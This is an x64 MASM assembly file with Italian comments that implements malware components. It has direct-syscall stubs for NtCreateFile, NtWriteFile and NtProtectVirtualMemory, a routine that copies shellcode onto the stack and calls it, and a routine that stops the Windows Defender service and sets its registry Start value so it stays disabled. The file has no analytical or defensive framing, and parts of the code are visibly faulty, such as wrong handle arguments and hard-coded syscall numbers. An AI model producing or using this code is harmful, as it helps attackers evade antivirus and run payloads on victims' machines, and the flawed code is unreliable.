; Syscalls diretti per Windows x64
.code

; Struttura per SYSCALL
EXTERN SW2_GetSyscallNumber: PROC    

; NtCreateFile syscall wrapper
NtCreateFileStub PROC
    mov r10, rcx
    mov eax, 55h    ; NtCreateFile syscall number
    syscall
    ret
NtCreateFileStub ENDP

; NtWriteFile syscall wrapper
NtWriteFileStub PROC
    mov r10, rcx
    mov eax, 08h    ; NtWriteFile syscall number
    syscall
    ret
NtWriteFileStub ENDP

; NtProtectVirtualMemory syscall wrapper
NtProtectVirtualMemoryStub PROC
    mov r10, rcx
    mov eax, 50h    ; NtProtectVirtualMemory syscall number
    syscall
    ret
NtProtectVirtualMemoryStub ENDP

; Custom shellcode injection routine
InjectShellcode PROC
    push rbp
    mov rbp, rsp
    
    ; Salva i registri
    push rbx
    push rdi
    push rsi
    
    ; Alloca spazio per lo shellcode
    sub rsp, 1000h
    
    ; Copia lo shellcode
    mov rdi, rsp        ; Destinazione
    mov rsi, rcx        ; Sorgente (primo parametro)
    mov rcx, rdx        ; Lunghezza (secondo parametro)
    rep movsb
    
    ; Esegui lo shellcode
    call rsp
    
    ; Ripristina i registri
    pop rsi
    pop rdi
    pop rbx
    
    mov rsp, rbp
    pop rbp
    ret
InjectShellcode ENDP

; Routine per disabilitare Windows Defender
DisableDefender PROC
    push rbp
    mov rbp, rsp
    sub rsp, 40h
    
    ; Ottieni handle al servizio WinDefend
    lea rcx, [ServiceName]
    mov rdx, SC_MANAGER_ALL_ACCESS
    xor r8, r8
    call OpenServiceW
    
    ; Verifica se l'handle è valido
    test rax, rax
    jz .exit
    
    ; Disabilita il servizio
    mov rcx, rax
    mov rdx, SERVICE_STOP
    lea r8, [ServiceStatus]
    call ControlService
    
    ; Modifica il registro per prevenire il riavvio
    lea rcx, [RegKeyPath]
    mov rdx, KEY_ALL_ACCESS
    lea r8, [hKey]
    call RegOpenKeyExW
    
    lea rcx, [hKey]
    lea rdx, [ValueName]
    xor r8, r8
    mov r9, REG_DWORD
    lea r10, [DisableValue]
    push r10
    push 4
    call RegSetValueExW
    
.exit:
    mov rsp, rbp
    pop rbp
    ret

ServiceName db "WinDefend",0
RegKeyPath db "SYSTEM\CurrentControlSet\Services\WinDefend",0
ValueName db "Start",0
DisableValue dd 4
hKey dq ?
ServiceStatus SERVICE_STATUS <>

DisableDefender ENDP

END
